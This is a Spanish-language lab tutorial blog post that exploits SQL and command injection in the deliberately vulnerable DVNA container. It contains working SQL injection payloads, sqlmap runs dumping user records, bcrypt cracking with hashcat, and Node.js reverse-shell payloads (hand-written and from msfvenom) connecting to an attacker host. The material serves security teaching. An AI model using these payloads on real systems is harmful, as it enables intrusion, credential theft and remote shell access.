---
layout: post
title:  "Aprende a realizar una inyeccion SQL"
description: "Explotando los 10 riesgos mas criticos segun el OWASP I"
date:   2019-07-10
image:  "img/OwaspTopTen.jpg"
tags:   [Inyeccion SQL, Password Cracking, Aprende Docker]
---

Hello Engineers!  
En el dia de hoy, vamos a aprender a explotar los diez riesgos más críticos en Aplicaciones Web.  
Para ello vamos a desplegar un laboratorio vulnerable con docker, donde se exponen las 10 principales vulnerabilidades del OWASP.  

## Conceptos Basicos  
**Docker**   
Docker es una plataforma de software que le permite crear, probar e implementar aplicaciones rápidamente. Docker empaqueta software en unidades estandarizadas llamadas contenedores que incluyen todo lo necesario para que el software se ejecute, incluidas bibliotecas, herramientas de sistema, código y tiempo de ejecución.  

**OWASP**  
Es un proyecto de código abierto dedicado a determinar y combatir las causas que hacen que el software sea inseguro. La Fundación OWASP es un organismo sin ánimo de lucro que apoya y gestiona los proyectos e infraestructura de OWASP. La comunidad OWASP está formada por empresas, organizaciones educativas y particulares de todo mundo.   
[Wikipedia](https://es.wikipedia.org/wiki/Open_Web_Application_Security_Project)  

## Instalacion de docker en kali-linux  
Para la instalacion de docker en Kali-linux, se debe colocar lo siguiente en la consola:  

{% highlight zsh %}
┌─[root@BinaryChaos] - [~] - [Thu Jun 27, 00:43]
└─[$]> curl -fsSL https://download.docker.com/linux/debian/gpg | apt-key add -
┌─[root@BinaryChaos] - [~] - [Thu Jun 27, 00:43]
└─[$]> echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' > /etc/apt/sources.list.d/docker.list
┌─[root@BinaryChaos] - [~] - [Thu Jun 27, 00:43]
└─[$]> apt-get remove docker docker-engine docker.io
┌─[root@BinaryChaos] - [~] - [Thu Jun 27, 00:43]
└─[$]> apt-get install docker-ce
{% endhighlight %}  

Listo, luego de la instalacion de docker vamos a descargar el contenedor [DVNA](https://github.com/appsecco/dvna).  

**Damn Vulnerable NodeJS Application (DVNA)**, Es una aplicación simple desarrollada en NodeJS que sirve para demostrar las 10 principales vulnerabilidades del OWASP y una guía para corregir y evitar estas vulnerabilidades.   

Para descargar y ejecutar localmente este contenedor debemos ejecutar lo siguiente:  

{% highlight zsh %}
┌─[root@BinaryChaos] - [~] - [Thu Jun 27, 00:43]
└─[$]> docker pull appsecco/dvna
┌─[root@BinaryChaos] - [~] - [Thu Jun 27, 00:43]
└─[$]> docker run --name dvna -p 9090:9090 -d appsecco/dvna:sqlite
{% endhighlight %}    

Para revisar si la ejecucion de nuestro contenedor fue exitosa debemos ejecutar lo siguiente:  

{% highlight zsh %}
## Primero listamos los contenedores disponibles en nuestra maquina:  
┌─[root@BinaryChaos] - [~] - [Thu Jun 27, 00:43]
└─[$]> docker ps -a                                               
CONTAINER ID        IMAGE                  COMMAND             CREATED              STATUS              PORTS                    NAMES
cdd7736ff432        appsecco/dvna:sqlite   "npm start"         About a minute ago   Up About a minute   0.0.0.0:9090->9090/tcp   dvna
## Tomamos el ID correspondiente a nuestra contenedor recien creado y lo concatenamos con el siguiente comando    
┌─[root@BinaryChaos] - [~] - [Thu Jun 27, 01:05]
└─[$]> docker inspect cdd7736ff432 | grep "IPAddress"
            "SecondaryIPAddresses": null,
            "IPAddress": "172.17.0.2",
                    "IPAddress": "172.17.0.2",
{% endhighlight %}    

Listo, con el comando anterior obtuvimos la IP donde esta corriendo nuestro docker.  
Si realizamos un escaneo de puertos sobre la IP encontrada, obtendremos lo siguiente:  

{% highlight zsh %}  
┌─[root@BinaryChaos] - [/home/gerh/Escritorio/Prometheus/Tests] - [Thu Jun 27, 01:16]
└─[$]> # nmap -sV -Pn -oN nmap.txt -oX dockerDAM.xml 172.17.0.2
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-27 01:17 -05
Nmap scan report for 172.17.0.2
Host is up (0.0000080s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE VERSION
9090/tcp open  http    Node.js Express framework
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds
{% endhighlight %}    

Si navegamos por el puerto 9090 sobre la IP anterior encontramos el siguiente aplicativo:  

<figure>
  <img src="{{site.baseurl}}/img/DAM.png" >
	<figcaption>
    <a href="{{site.baseurl}}/img/DAM.png" title="Aplicativo web corriendo en el puerto 9090">Aplicativo web corriendo en el puerto 9090</a>.
  </figcaption>
</figure>


## Creacion de usuario para el acceso al laboratorio  
Debemos acceder a la siguiente ruta para crear nuestro usuario:  
http://172.17.0.2:9090/register  

<figure>
  <img src="{{site.baseurl}}/img/DAM2.png" >
	<figcaption>
    <a href="{{site.baseurl}}/img/DAM2.png" title="Registro de usuarios para acceder al laboratorio">Registro de usuarios para acceder al laboratorio</a>.
  </figcaption>
</figure>

Luego de autenticarnos, tendremos acceso al siguiente link:  
http://172.17.0.2:9090/learn  

<figure>
  <img src="{{site.baseurl}}/img/DAM3.png" >
	<figcaption>
    <a href="{{site.baseurl}}/img/DAM3.png" title="Registro de usuarios para acceder al laboratorio">Registro de usuarios para acceder al laboratorio</a>.
  </figcaption>
</figure>

## Explotando las vulnerabilidades mas criticas en aplicaciones WEB.  
## A1. Injection  
**Escenario de la prueba:**  
Inyección de SQL: Por medio de un formulario de búsqueda de usuarios.  

**Inyeccion SQL**  
Es un ataque contra un sitio o aplicación web en el que se añade código de lenguaje de consulta estructurado (SQL) a un campo de entrada de un formulario web con el objetivo de acceder a una cuenta o modificar los datos de la Base de datos.  

En la siguiente captura de pantalla, podemos apreciar un formulario simple que realiza una validacion de usuarios contra una base de datos SQL.  

<figure>
  <img src="{{site.baseurl}}/img/DAM4.png" >
	<figcaption>
    <a href="{{site.baseurl}}/img/DAM4.png" title="Formulario vulnerable a inyecciones SQL">Formulario vulnerable a inyecciones SQL</a>.
  </figcaption>
</figure>

La consulta SQL del formulario anterior, es la siguiente:  

{% highlight sql %}  
-- Consulta para validar la existencia de un usuario en la tabla de Users
SELECT * FROM users WHERE login='Gerh';  
-- Consulta alterada para evadir el login anterior
SELECT * FROM users WHERE login='' or 1=1--
-- Consulta usando el operador UNION para imprimir un mensaje en el aplicativo.  
SELECT * FROM users WHERE login='' union select 1,"Hacked By Gerh"-- -
{% endhighlight %}      

Usando el operador UNION de SQL, para imprimir un mensaje en el aplicativo web.  

<figure>
  <img src="{{site.baseurl}}/img/DAM5.png" >
	<figcaption>
    <a href="{{site.baseurl}}/img/DAM5.png" title="Inyectando codigo SQL sobre un aplicativo WEB">Inyectando codigo SQL sobre un aplicativo WEB</a>.
  </figcaption>
</figure>

Luego de identificar este formulario vulnerable a inyecciones SQL, podemos usar una herramienta automatizada para facilitar la explotacion de dicha vulnerabilidad.  
**Usando SQLMAP**  
SQLmap, Es una herramienta desarrollada en python para realizar inyección de código sql automáticamente. Su objetivo es detectar y aprovechar las vulnerabilidades de inyección SQL en aplicaciones web.  

La consulta que se realizar en el formulario expuesto es por medio de una peticion de tipo POST con una cookie de sesion.   

SQLMap admite la explotación de una amplia gama de DBMS, la lista incluye los siguientes nombres:  

| DBMS                 | DBMS             | DBMS     |
|----------------------|------------------|----------|
| MySQL                | IBM DB2          | Sybase   |
| Postgresql           | SQLite           | Firebird |
| Microsoft SQL Server | Microsoft Access | Oracle   |
| Oracle               | SAP MaxDB        |          |

Identificando el gestor de base de datos usado en la aplicacion:  

{% highlight zsh %}  
┌─[root@BinaryChaos] - [/home/gerh/Escritorio/Prometheus/Tests] - [Thu Jun 27, 03:18]
└─[$]> # sqlmap -u "http://172.17.0.2:9090/app/usersearch" --cookie="connect.sid=s%3Ahbsj8Q9LncwBa5WvzuJT905FGSmgF-Sm.etNjaXJx4%2BXt5pn0Xxe7voCeWf3ppz7eKO0TILE3c9M" --data="login=Gerh" --dbs
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.3.6#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 03:19:08 /2019-06-27/

[03:19:08] [INFO] resuming back-end DBMS 'sqlite' 
[03:19:08] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: login (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: login=Gerh' AND 4169=4169 AND 'XNeY'='XNeY

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: login=-6864' UNION ALL SELECT CHAR(113)||CHAR(113)||CHAR(120)||CHAR(120)||CHAR(113)||CHAR(111)||CHAR(87)||CHAR(110)||CHAR(115)||CHAR(117)||CHAR(115)||CHAR(68)||CHAR(81)||CHAR(79)||CHAR(90)||CHAR(85)||CHAR(118)||CHAR(122)||CHAR(76)||CHAR(101)||CHAR(86)||CHAR(82)||CHAR(103)||CHAR(69)||CHAR(70)||CHAR(101)||CHAR(79)||CHAR(81)||CHAR(115)||CHAR(74)||CHAR(82)||CHAR(72)||CHAR(84)||CHAR(72)||CHAR(88)||CHAR(65)||CHAR(79)||CHAR(76)||CHAR(73)||CHAR(86)||CHAR(90)||CHAR(100)||CHAR(65)||CHAR(75)||CHAR(103)||CHAR(113)||CHAR(113)||CHAR(118)||CHAR(98)||CHAR(113),NULL-- PnZX
---
[03:19:08] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[03:19:08] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
[03:19:08] [INFO] fetched data logged to text files under '/root/.sqlmap/output/172.17.0.2'

{% endhighlight %}      

Gracias al resultado anterior logramos identificar que el gestor de base de datos usado para la aplicacion afectada es SQLite.  
Vamos a indicarle el parametro **--tables**, para extraer el nombre de las tablas de la base de datos; Seguido del parametro **--dbms=sqlite** el cual especifica el DBMS.  

{% highlight zsh %}  
┌─[root@BinaryChaos] - [/home/gerh/Escritorio/Prometheus/Tests] - [Thu Jun 27, 03:12]
└─[$]> # sqlmap -u "http://172.17.0.2:9090/app/usersearch" --cookie="connect.sid=s%3Ahbsj8Q9LncwBa5WvzuJT905FGSmgF-Sm.etNjaXJx4%2BXt5pn0Xxe7voCeWf3ppz7eKO0TILE3c9M" --data="login=Gerh" --tables --dbms=sqlite
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.6#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 03:17:59 /2019-06-27/

[03:17:59] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: login (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: login=Gerh' AND 4169=4169 AND 'XNeY'='XNeY

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: login=-6864' UNION ALL SELECT CHAR(113)||CHAR(113)||CHAR(120)||CHAR(120)||CHAR(113)||CHAR(111)||CHAR(87)||CHAR(110)||CHAR(115)||CHAR(117)||CHAR(115)||CHAR(68)||CHAR(81)||CHAR(79)||CHAR(90)||CHAR(85)||CHAR(118)||CHAR(122)||CHAR(76)||CHAR(101)||CHAR(86)||CHAR(82)||CHAR(103)||CHAR(69)||CHAR(70)||CHAR(101)||CHAR(79)||CHAR(81)||CHAR(115)||CHAR(74)||CHAR(82)||CHAR(72)||CHAR(84)||CHAR(72)||CHAR(88)||CHAR(65)||CHAR(79)||CHAR(76)||CHAR(73)||CHAR(86)||CHAR(90)||CHAR(100)||CHAR(65)||CHAR(75)||CHAR(103)||CHAR(113)||CHAR(113)||CHAR(118)||CHAR(98)||CHAR(113),NULL-- PnZX
---
[03:18:00] [INFO] testing SQLite
[03:18:00] [INFO] confirming SQLite
[03:18:00] [INFO] actively fingerprinting SQLite
[03:18:00] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[03:18:00] [INFO] fetching tables for database: 'SQLite_masterdb'
[03:18:00] [WARNING] the SQL query provided does not return any output
[03:18:00] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[03:18:00] [INFO] fetching number of tables for database 'SQLite_masterdb'
[03:18:00] [INFO] resumed: 3
[03:18:00] [INFO] resumed: Products
[03:18:00] [INFO] resumed: sqlite_sequence
[03:18:00] [INFO] resumed: Users
Database: SQLite_masterdb
[3 tables]
+-----------------+
| Products        |
| Users           |
| sqlite_sequence |
+-----------------+

[03:18:00] [INFO] fetched data logged to text files under '/root/.sqlmap/output/172.17.0.2'
{% endhighlight %}      

Logramos encontrar 3 tablas:  
{% highlight markdown %}  
+-----------------+
| Products        |
| Users           |
| sqlite_sequence |
+-----------------+
{% endhighlight %}      

Vamos a listar el tipo de campos que tiene la tabla **Users**.  
Para ello debemos indicarle la tabla que queremos revisar con el parametro **-T Users**, seguido de **--columns** para indicar el tipo de las columnas encontradas.  

{% highlight zsh %}  
┌─[root@BinaryChaos] - [/home/gerh/Escritorio/Prometheus/Tests] - [Thu Jun 27, 03:09]
└─[$]> # sqlmap -u "http://172.17.0.2:9090/app/usersearch" --cookie="connect.sid=s%3Ahbsj8Q9LncwBa5WvzuJT905FGSmgF-Sm.etNjaXJx4%2BXt5pn0Xxe7voCeWf3ppz7eKO0TILE3c9M" --data="login=Gerh" -T Users --columns --dbms=sqlite
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.3.6#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[*] starting @ 03:11:06 /2019-06-27/

[03:11:06] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: login (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: login=Gerh' AND 4169=4169 AND 'XNeY'='XNeY

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: login=-6864' UNION ALL SELECT CHAR(113)||CHAR(113)||CHAR(120)||CHAR(120)||CHAR(113)||CHAR(111)||CHAR(87)||CHAR(110)||CHAR(115)||CHAR(117)||CHAR(115)||CHAR(68)||CHAR(81)||CHAR(79)||CHAR(90)||CHAR(85)||CHAR(118)||CHAR(122)||CHAR(76)||CHAR(101)||CHAR(86)||CHAR(82)||CHAR(103)||CHAR(69)||CHAR(70)||CHAR(101)||CHAR(79)||CHAR(81)||CHAR(115)||CHAR(74)||CHAR(82)||CHAR(72)||CHAR(84)||CHAR(72)||CHAR(88)||CHAR(65)||CHAR(79)||CHAR(76)||CHAR(73)||CHAR(86)||CHAR(90)||CHAR(100)||CHAR(65)||CHAR(75)||CHAR(103)||CHAR(113)||CHAR(113)||CHAR(118)||CHAR(98)||CHAR(113),NULL-- PnZX
---
[03:11:06] [INFO] testing SQLite
[03:11:06] [INFO] confirming SQLite
[03:11:06] [INFO] actively fingerprinting SQLite
[03:11:06] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[03:11:06] [INFO] fetching columns for table 'Users' in database 'SQLite_masterdb'
[03:11:06] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[03:11:06] [WARNING] unable to retrieve column names for table 'Users' in database 'SQLite_masterdb'
Database: SQLite_masterdb
Table: Users
[29 columns]
+------------------+---------+
| Column           | Type    |
+------------------+---------+
| adres_e-mailowy  | numeric |
| adrese-mail      | numeric |
| adressee-mail    | numeric |
| before           | numeric |
| caroline-du-nord | numeric |
| cvvnumber]       | numeric |
| e-mail           | numeric |
| e-posta          | numeric |
| e-posta_adres    | numeric |
| e-posta_adresi   | numeric |
| e-postaadres     | numeric |
| e-postaadresi    | numeric |
| full             | numeric |
| group            | numeric |
| int4             | numeric |
| key              | numeric |
| level            | numeric |
| long             | numeric |
| replace          | numeric |
| show             | numeric |
| user             | numeric |
| version          | numeric |
| email            | numeric |
| id               | numeric |
| login            | numeric |
| name             | numeric |
| oid              | numeric |
| password         | numeric |
| rowid            | numeric |
+------------------+---------+

[03:11:06] [INFO] fetched data logged to text files under '/root/.sqlmap/output/172.17.0.2'
{% endhighlight %}    

Con el resultado anterior, logramos identificar que todas las columnas son de tipo numerico.  
Ahora vamos a intentar revisar el contenido de la tabla **Users**, para ello debemos usar el parametro **-T Users --dump**.   

{% highlight zsh %}  
┌─[root@BinaryChaos] - [/home/gerh/Escritorio/Prometheus/Tests] - [Thu Jun 27, 02:54]
└─[$]> # sqlmap -u "http://172.17.0.2:9090/app/usersearch" --cookie="connect.sid=s%3Ahbsj8Q9LncwBa5WvzuJT905FGSmgF-Sm.etNjaXJx4%2BXt5pn0Xxe7voCeWf3ppz7eKO0TILE3c9M" --data="login=Gerh" -T Users --dump --dbms=sqlite
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.3.6#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[02:55:05] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: login (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: login=Gerh' AND 4169=4169 AND 'XNeY'='XNeY

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: login=-6864' UNION ALL SELECT CHAR(113)||CHAR(113)||CHAR(120)||CHAR(120)||CHAR(113)||CHAR(111)||CHAR(87)||CHAR(110)||CHAR(115)||CHAR(117)||CHAR(115)||CHAR(68)||CHAR(81)||CHAR(79)||CHAR(90)||CHAR(85)||CHAR(118)||CHAR(122)||CHAR(76)||CHAR(101)||CHAR(86)||CHAR(82)||CHAR(103)||CHAR(69)||CHAR(70)||CHAR(101)||CHAR(79)||CHAR(81)||CHAR(115)||CHAR(74)||CHAR(82)||CHAR(72)||CHAR(84)||CHAR(72)||CHAR(88)||CHAR(65)||CHAR(79)||CHAR(76)||CHAR(73)||CHAR(86)||CHAR(90)||CHAR(100)||CHAR(65)||CHAR(75)||CHAR(103)||CHAR(113)||CHAR(113)||CHAR(118)||CHAR(98)||CHAR(113),NULL-- PnZX
---
[02:55:05] [INFO] testing SQLite
[02:55:05] [INFO] confirming SQLite
[02:55:05] [INFO] actively fingerprinting SQLite
[02:55:05] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[02:55:05] [INFO] fetching columns for table 'Users' in database 'SQLite_masterdb'
[02:55:05] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
[02:55:05] [WARNING] unable to retrieve column names for table 'Users' in database 'SQLite_masterdb'
[02:55:05] [INFO] fetching entries for table 'Users' in database 'SQLite_masterdb'
[02:55:06] [INFO] used SQL query returns 1 entry
Database: SQLite_masterdb
Table: Users
[1 entry]
+----+-----+-------+------+-------+------------------------+-------+--------+--------+--------+--------+--------+---------+---------+----------+--------------------------------------------------------------+----------+-----------+-----------+-----------+--------------+---------------+----------------+-----------------+-----------------+-----------------+------------------+-------------------+--------------------+
| id | oid | rowid | name | key   | email                  | login | user   | int4   | full   | show   | long   | level   | group   | e-mail   | password                                                     | before   | e-posta   | version   | replace   | cvvnumber]   | adrese-mail   | e-postaadres   | adressee-mail   | e-posta_adres   | e-postaadresi   | e-posta_adresi   | adres_e-mailowy   | caroline-du-nord   |
+----+-----+-------+------+-------+------------------------+-------+--------+--------+--------+--------+--------+---------+---------+----------+--------------------------------------------------------------+----------+-----------+-----------+-----------+--------------+---------------+----------------+-----------------+-----------------+-----------------+------------------+-------------------+--------------------+
| 1  | 1   | 1     | Gerh | key   | gerueda6@misena.edu.co | Gerh  | user   | int4   | full   | SHOW   | long   | level   | group   | e-mail   | $2a$10$Eer9AIio76EnSOfLNhkQIOZoYH45Y7CiYjvBrKcB4IVklhjkFsYe. | before   | e-posta   | version   | replace   | cvvnumber]   | adrese-mail   | e-postaadres   | adressee-mail   | e-posta_adres   | e-postaadresi   | e-posta_adresi   | adres_e-mailowy   | caroline-du-nord   |
+----+-----+-------+------+-------+------------------------+-------+--------+--------+--------+--------+--------+---------+---------+----------+--------------------------------------------------------------+----------+-----------+-----------+-----------+--------------+---------------+----------------+-----------------+-----------------+-----------------+------------------+-------------------+--------------------+

[02:55:06] [INFO] table 'SQLite_masterdb.Users' dumped to CSV file '/root/.sqlmap/output/172.17.0.2/dump/SQLite_masterdb/Users.csv'
{% endhighlight %}    

Si en dado caso no queremos dar uso de la herramienta SQLMAP, podemos usar el siguiente payload:  

{% highlight sql %}  
' UNION SELECT password,1 from Users where login='ElNombreDelUsuarioAConsultar' -- //
{% endhighlight %}    

<figure>
  <img src="{{site.baseurl}}/img/DAM5.1.png" >
	<figcaption>
    <a href="{{site.baseurl}}/img/DAM5.1.png" title="Mostrando la contraseña del usuario Administrador">Mostrando la contraseña del usuario Administrador</a>.
  </figcaption>
</figure>

La contraseña anterior esta codificada en BCRYPT.  

{% highlight markdown %}  
$2a$10$hVTWi4gUzy5YFeKdP9wKyeg3x1oFMLiqAAAA22AVHen/Oy.L2UZVy
{% endhighlight %}    

Una forma facil para validar o identificar su tipo de hash es usando la herramienta online HashAnalizer.  

{% highlight markdown %}  
https://www.tunnelsup.com/hash-analyzer/
{% endhighlight %}    

<figure>
  <img src="{{site.baseurl}}/img/DAM5.2.png" >
	<figcaption>
    <a href="{{site.baseurl}}/img/DAM5.2.png" title="Identificando el tipo de HASH con HashAnalizer">Identificando el tipo de HASH con HashAnalizer</a>.
  </figcaption>
</figure>

Vamos a proceder a usar la herramienta **hashcat** para realizar un ataque de fuerza bruta sobre el hash previamente encontrado.  

{% highlight zsh %}  
┌─[root@BinaryChaos] - [/home/gerh/Escritorio/Prometheus] - [Sun Jun 30, 08:54]
└─[$]> # hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt --show
$2a$10$hVTWi4gUzy5YFeKdP9wKyeg3x1oFMLiqAAAA22AVHen/Oy.L2UZVy:jiujitsu
{% endhighlight %}    

Listo, hemos encontrado las credenciales del administrador; por lo tanto podemos autenticarnos en el sistema con este usuario sin ningun problema.  
Las credenciales para este usuario son: **jiujitsu**.  

## Explotando las vulnerabilidades mas criticas en aplicaciones WEB.  
## A1.1 Inyeccion  
**Escenario de la prueba:**  
Inyección de comandos por medio de un formulario realizado para pruebas de conectividad en la red.  

**Inyeccion de Codigo**  
Es la ejecuccion de comandos o inyeccion de código sobre una aplicación generalmente aprovechando alguna vulnerabilidad.  

<figure>
  <img src="{{site.baseurl}}/img/DAM6.png" >
	<figcaption>
    <a href="{{site.baseurl}}/img/DAM6.png" title="Validando el uso de un aplicativo web">Analizando el comportamiento de la APP</a>.
  </figcaption>
</figure>

Hacemos uso del siguiente operador para ejecutar comandos sobre el servidor victima.  

<figure>
  <img src="{{site.baseurl}}/img/DAM7.png" >
	<figcaption>
    <a href="{{site.baseurl}}/img/DAM7.png" title="Validando el uso de un aplicativo web">Analizando el comportamiento de la APP</a>.
  </figcaption>
</figure>

Obteniendo una shell inversa con NODEJS.  
Podemos usar el siguiente payload:  

{% highlight js %}  
node -e "(function(){ var net = require('net'), cp = require('child_process'), sh = cp.spawn('/bin/sh', []); var client = new net.Socket(); client.connect(6969, '172.17.0.1', function(){ client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; })();"
{% endhighlight %}    

Si deseamos generar el payload con MSFVENOM, debemos ejecutar el siguiente comando:  

{% highlight zsh %}  
┌─[root@BinaryChaos] - [/home/gerh/Escritorio/Prometheus/Tests] - [Thu Jun 27, 04:42]
└─[$]> # msfvenom -p nodejs/shell_reverse_tcp LHOST=172.17.0.1 LPORT=6969
[-] No platform was selected, choosing Msf::Module::Platform::NodeJS from the payload
[-] No arch selected, selecting arch: nodejs from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 798 bytes
 (function(){ var require = global.require || global.process.mainModule.constructor._load; if (!require) return; var cmd = (global.process.platform.match(/^win/i)) ? "cmd" : "/bin/sh"; var net = require("net"), cp = require("child_process"), util = require("util"), sh = cp.spawn(cmd, []); var client = this; var counter=0; function StagerRepeat(){ client.socket = net.connect(6969, "172.17.0.1", function() { client.socket.pipe(sh.stdin); if (typeof util.pump === "undefined") { sh.stdout.pipe(client.socket); sh.stderr.pipe(client.socket); } else { util.pump(sh.stdout, client.socket); util.pump(sh.stderr, client.socket); } }); socket.on("error", function(error) { counter++; if(counter<= 10){ setTimeout(function() { StagerRepeat();}, 5*1000); } else process.exit(); }); } StagerRepeat(); })();
{% endhighlight %}    

Ahora solo debemos concatenar nuestro payload con el operador previamente indicado y obtendremos ejecuccion de codigo remoto sobre el aplicativo web.  

<script id="asciicast-253894" src="https://asciinema.org/a/253894.js" async></script>

## Aprende hacking explotando las vulnerabilidades mas criticas en aplicaciones WEB.  

 - [A1: Inyección](https://hackingprofessional.github.io/Security/Como-realizar-una-inyeccion-SQL-OWASP-I)   
 - [A2: Pérdida de Autenticación](https://hackingprofessional.github.io/Security/Perdida-de-autenticacion-y-exposicion-de-datos-OWASP-II)  
 - [A3: Exposición de datos sensibles](https://hackingprofessional.github.io/Security/Perdida-de-autenticacion-y-exposicion-de-datos-OWASP-II)  
 - [A4: Entidades Externas XML (XXE)](https://hackingprofessional.github.io/Security/Como-realizar-una-inyeccion-XML-OWASP-III)  
 - [A5: Pérdida de Control de Acceso](https://hackingprofessional.github.io/Security/Evadiendo-controles-de-acceso-OWASP-IV)  
 - [A6: Configuración de Seguridad Incorrecta](https://hackingprofessional.github.io/Security/El-riesgo-de-las-Configuraciones-Incorrectas-de-Seguridad-OWAPS-V/)  
 - [A7: Secuencia de Comandos en Sitios Cruzados (XSS)](https://hackingprofessional.github.io/Security/Aprende-a-realizar-una-inyeccion-XSS-OWASP-VI)  
 - [A8: Deserialización Insegura](https://hackingprofessional.github.io/Security/Aprende-que-es-Deserializacion-Insegura-OWASP-VII/)  
 - [A9: Componentes con vulnerabilidades conocidas](https://hackingprofessional.github.io/Security/Explotando-vulnerabilidades-conocidas-OWASP-VIII)  
 - [A10: Registro y Monitoreo Insuficientes](https://hackingprofessional.github.io/Security/Explotando-vulnerabilidades-conocidas-OWASP-VIII)  


 [Para mas informacion leer el siguiente PDF publicado por el OWASP](https://www.owasp.org/images/5/5e/OWASP-Top-10-2017-es.pdf)